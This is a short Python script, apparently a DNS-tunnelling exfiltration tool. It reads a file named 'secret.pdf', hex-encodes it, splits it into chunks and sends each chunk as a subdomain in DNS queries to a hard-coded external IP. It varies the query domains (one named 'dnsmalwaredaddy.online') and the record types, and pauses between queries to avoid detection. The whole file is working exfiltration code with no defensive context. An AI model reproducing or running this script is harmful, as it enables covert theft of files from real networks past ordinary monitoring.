from textwrap import wrap
import base64
from scapy.all import *


dns_server = "3.253.51.115"
def exfiltration(server_ip,dns_query,param_dns_qtype):
    query = IP(id=RandShort(),dst=server_ip) / UDP(sport=RandShort(), dport=53) / DNS(id=RandShort(),qr=0, rd=1, arcount=1, qd=DNSQR(qname=dns_query,qtype=param_dns_qtype)) / DNSRROPT(type="OPT",rclass=1280,version=0)
    send_message_status = send(query, verbose=False)
    print("Sending...")


with open("secret.pdf", "rb") as pdf_file:
    fileContent = base64.b64encode(pdf_file.read())
    new_hex = base64.b64decode(fileContent).hex()


divided = wrap(new_hex,20)
x=1
domain_list = ["dnsmalwaredaddy.online","laleler-denemeler.top"]
dns_qtype_list = ["A","CNAME","TXT","AAAA"]
custom_string = "NV2WI2LL"
for i in divided:
    new_value = str(x)+"."+i
    x+=1
    domain= random.choice(domain_list)
    dns_query_type = random.choice(dns_qtype_list)
    query= (new_value+"."+custom_string+"."+domain)
    exfiltration(dns_server, query,dns_query_type)
    print("Query:",query)
    time.sleep(1)
